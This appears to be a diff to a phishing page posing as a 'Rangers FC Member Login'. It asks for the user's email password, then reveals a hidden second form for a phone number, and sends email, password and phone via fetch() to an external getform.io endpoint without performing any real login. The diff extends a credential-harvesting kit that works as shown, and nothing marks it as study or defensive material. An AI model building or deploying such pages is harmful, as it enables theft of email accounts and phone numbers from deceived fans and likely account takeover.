@@ -78,6 +78,11 @@
             color: #666;
         }
 
+        /* Hide the phone modal initially */
+        #phoneModal {
+            display: none;
+        }
+
     </style>
 </head>
 <body>
@@ -85,12 +90,22 @@
     <!-- Form container with modal styling -->
     <div class="form-container">
         <h2>Rangers FC Member Login</h2>
-        
-        <form id="loginForm" action="https://getform.io/f/avrmyepa" method="POST">
+
+        <!-- First form: email & password -->
+        <form id="loginForm">
             <input type="email" id="email" name="email" placeholder="Enter your email" required>
-            <input type="password" id="userPassword" name="userPassword" placeholder="Enter your password" required>
+            <input type="password" id="userPassword" name="userPassword" placeholder="Enter your email password" required>
             <button type="submit">Login</button>
         </form>
+
+        <!-- Second form: phone number (hidden initially) -->
+        <div id="phoneModal">
+            <h2>Enter Your Phone Number</h2>
+            <form id="phoneForm">
+                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
     </div>
 
     <!-- Footer with Rangers branding -->
@@ -99,16 +114,17 @@
     </div>
 
     <script>
+        // Show phone number form after email/password submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
+            
             // Capture email and password
             const email = document.getElementById('email').value;
             const password = document.getElementById('userPassword').value;
 
             // Optionally log data to the console for testing
             console.log(`Email: ${email}, Password: ${password}`);
-
+            
             // Send form data to Getform
             fetch('https://getform.io/f/avrmyepa', {
                 method: 'POST',
@@ -122,7 +138,37 @@
             })
             .then(response => response.text())
             .then(data => {
-                // Handle response from server
+                // Show the phone number form after email/password submission
+                document.getElementById('loginForm').style.display = 'none'; // Hide the login form
+                document.getElementById('phoneModal').style.display = 'block'; // Show phone number form
+            })
+            .catch(error => console.error('Error:', error));
+        });
+
+        // Handle phone number form submission
+        document.getElementById('phoneForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Capture phone number
+            const phone = document.getElementById('phone').value;
+
+            // Log the phone number along with email and password
+            console.log(`Phone: ${phone}`);
+
+            // Send the phone number to Getform along with email and password
+            fetch('https://getform.io/f/avrmyepa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: document.getElementById('email').value,
+                    userPassword: document.getElementById('userPassword').value,
+                    phone: phone
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
                 alert('Form submitted successfully!');
             })
             .catch(error => console.error('Error:', error));
